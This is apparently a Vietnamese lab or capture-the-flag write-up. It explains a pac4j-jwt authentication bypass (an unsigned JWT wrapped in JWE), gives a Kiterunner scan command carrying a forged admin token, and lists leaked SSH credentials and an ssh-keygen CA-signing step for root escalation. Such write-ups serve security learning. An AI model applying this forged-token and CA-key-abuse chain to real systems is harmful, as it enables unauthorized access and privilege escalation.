### Reconnaisance
![](Attachments/Pasted%20image%2020260418170234.png)

### Khai thác web (8080)
Giao diện web site:
![](Attachments/Pasted%20image%2020260418170626.png)

powered by pac4j.?
Gửi thử yêu cầu đăng nhập:
![](Attachments/Pasted%20image%2020260418170807.png)

![697](Attachments/Pasted%20image%2020260418170845.png)

pac4j-jwt/6.0.3 -> CVE-2026-29000: https://snyk.io/articles/public-key-breaks-authentication-pac4j-jwt/
JWT-JWS-JWE:
JWT: https://viblo.asia/p/tim-hieu-ve-json-web-token-jwt-7rVRqp73v4bP
JWE: https://medium.com/@idenisko/understanding-the-jwe-token-a-practical-guide-942224f6a9b6#2eea
![](Attachments/Pasted%20image%2020260418171349.png)

JWS (JSON Web Signature): Nhằm đảm bảo tính toàn vẹn và xác thực. Dữ liệu bên trong token chỉ được ký (signed) chứ không được mã hóa. Bất kỳ ai bắt được token đều có thể đọc được nội dung (payload), nhưng chữ ký ở cuối giúp hai bên trao đổi xác nhận rằng dữ liệu hoàn toàn chưa bị chỉnh sửa.
JWE (JSON Web Encryption): Nhằm đảm bảo tính bảo mật (Confidentiality). Dữ liệu (payload) thực sự bị mã hóa, nên chỉ có người nhận đích thực (người có khóa giải mã hợp lệ) mới có thể đọc được thông tin nhạy cảm bên trong.
	JWE không chỉ đơn thuần là mã hóa khối payload, mà nó kết hợp mã hóa đối xứng và bất đối xứng một cách thông minh.
	Đầu tiên, dữ liệu hữu ích (payload) được mã hóa bằng một khóa đối xứng dùng một lần, gọi là CEK (Content Encryption Key).
	Sau đó, chính cái khóa CEK này lại được mã hóa bằng Khóa công khai (Public Key) của người nhận.
	Tác giả nhấn mạnh đây không phải là "mã hóa kép" dữ liệu, mà là mã hóa dữ liệu trước, sau đó mã hóa cái khóa vừa dùng để mã hóa dữ liệu đó.
	![661](Attachments/Pasted%20image%2020260418172309.png)
	
JWS kết hợp JWE:
##### Quy trình Tạo (Phía Client/Sender):
- Tạo ra dữ liệu JSON gốc (Payload).
- Dùng Private Key của người gửi để Ký (Sign) dữ liệu này, tạo thành một chuỗi JWS hoàn chỉnh (`Header.Payload.Signature`). (-> Lỗ hổng)
- Lấy _toàn bộ chuỗi JWS_ đó coi như là một Payload mới.
- Dùng Public Key của người nhận để Mã hóa (Encrypt) Payload mới này, tạo ra chuỗi JWE (`Header.EncKey.IV.Ciphertext.Tag`). Chuỗi `Ciphertext` lúc này chính là JWS đã bị mã hóa.
![](Attachments/Pasted%20image%2020260418174541.png)

##### Quy trình Mở (Phía Server/Receiver):
- Nhận được chuỗi JWE 5 phần.
- Dùng Private Key của server để Giải mã (Decrypt) vỏ JWE. Kết quả thu được (phần Ciphertext được giải mã) là một chuỗi JWS.
- Dùng Public Key của người gửi để Xác minh chữ ký (Verify) của chuỗi JWS này.
- Nếu chữ ký đúng, trích xuất Payload gốc từ JWS để xử lý.
![](Attachments/Pasted%20image%2020260418172356.png)

Phân tích CVE-2026-29000:
Khi JwtAuthenticator của pac4j nhận được một JWT (JWE) đã mã hóa, nó sẽ thực hiện quy trình sau:
- Giải mã lớp vỏ JWE bên ngoài
- Phân tích nội dung bên trong
- Xác minh chữ ký trên token bên trong
Lỗ hổng nằm ở bước 3. Sau khi giải mã JWE, thư viện gọi hàm toSignedJWT() của com.nimbusds:nimbus-jose-jwt trên nội dung bên trong để trích xuất token đã ký để xác minh. Nếu token bên trong là PlainJWT (một JWT với alg: none, nghĩa là không có chữ ký nào cả), phương thức này sẽ trả về null.
```java
// (after JWE decryption succeeds above)
SignedJWT signedJWT = encryptedJWT.getPayload().toSignedJWT();

// If inner token is PlainJWT, signedJWT is null
if (signedJWT != null) {
    jwt = signedJWT;
}

// Signature verification only runs if signedJWT is not null
if (signedJWT != null && !signatureConfigurations.isEmpty()) {
    // Verify signature... but this block is NEVER entered
    // for a PlainJWT wrapped in JWE
}

// Claims are extracted regardless — attacker is now "authenticated"
createJwtProfile(ctx, credentials, jwt);
```
Khai thác:
Lấy RSA Public Key của Server
Tạo JWT với claims tuỳ ý:
```json
{
  "sub": "admin",
  "role": "ADMIN"
}
```

Mã hoá JWT với khoá RSA public key của Server
Gửi token tới các endpoint của ứng dụng web
Ứng dụng web giải mã JWE, thấy không có chữ ký để xác nhận, bỏ qua và chấp thuận JWT

Các bước thực hiện:
Khi truy cập đến endpoint /dashboard (điều hướng 1 hồi thì ra endpoint GET /api/auth/jwks, server trả về JWEK
![](Attachments/Pasted%20image%2020260418180506.png)

Mã hoá JWT: không có thuật toán

![](Attachments/Pasted%20image%2020260418180035.png)

Mã hoá JWE:

![](Attachments/Pasted%20image%2020260418180536.png)
Test Token:
![](Attachments/Pasted%20image%2020260418182720.png)

Trả về 404 -> token đúng, sai thì nó trả 401
Cầm JWE này gửi đi các endpind để xác thực, dùng Kiterunner
https://infosecwriteups.com/api-endpoints-discovery-using-kiterunner-ded82e092543
Kiterunner is a tool designed for brute-forcing API endpoints using wordlists generated from OpenAPI specifications. Unlike traditional fuzzers that rely on wordlists meant for web paths, Kiterunner focuses on structured API routes, making it a powerful tool for API recon.
Why Use Kiterunner?
- Discovers hidden API endpoints that may not be documented
- Works with structured API wordlists
- Works on both REST and GraphQL APIs
Wordlists:
![](Attachments/Pasted%20image%2020260418181025.png)

`kr scan -A apiroutes-260227 http://10.129.20.208:8080 -H "Authorization: Bearer eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkEyNTZHQ00ifQ.QZtgy6jtaQFSkfuSeVZGj7YnQkGNHG5vGPTPhpsfJwTPVsMrByJlT2GC63C6SI1SuqBFvOBJSmc-Q2sGrSn8kuiaxwA-rLcJhnAttiiOS9u2YbbYvKTs8BWMLd2r60lW0nS0tqcwqcg2ihW0ndI9Pmo2llt2wkCa4d0eT_pg3nFg7SGrohszIiPA-djNSloguEPo0ncj_eJ0ajGOTQL4qyfPtY9WMQjHjH-OhYH-Y5fu6sap-0bZ4X_tvUPOf63H5H0p32NauC-PGs15X2i4eETf66yvgyFp23kigPazCAphAbevCcjZQ_-_ULwwTxIXogzq4FFqZnzA3Oh7rGPLoA.JN25cbGP0ntRNIQp.GArSF_PWa_Vn_9uijTgKWmfVtrkSh4G3zQNTep0k57u-D2_u6fHg2Ye_DEGHu-gG7JO9jMGihu0ViJNy1Xay8bpBGIfIoi5CvTb053t7wDj5OSo-.JLKcDevEzQ2LlpAbjVjmog"`

![](Attachments/Pasted%20image%2020260418183042.png)

endpoint /api/users:
![](Attachments/Pasted%20image%2020260418183129.png)

endpoint /api/settings:
![](Attachments/Pasted%20image%2020260418183204.png)

dành được quyền truy cập ssh: 
svc-deploy/D3pl0y_$\$H_Now42!
![](Attachments/Pasted%20image%2020260418183816.png)

### Leo thang:
![](Attachments/Pasted%20image%2020260418183857.png)

Vấn đề: Server chấp nhận ssh theo key được ký bởi CA, mà ta lại có được private key của CA -> tự tạo key và ký
![](Attachments/Pasted%20image%2020260418184302.png)

![](Attachments/Pasted%20image%2020260418184904.png)

`ssh-keygen -s /tmp/ca -I "pham_long_vu" -n ubuntu,root -V +4h id_rsa.pub`

![](Attachments/Pasted%20image%2020260418185154.png)

![](Attachments/Pasted%20image%2020260418185303.png)


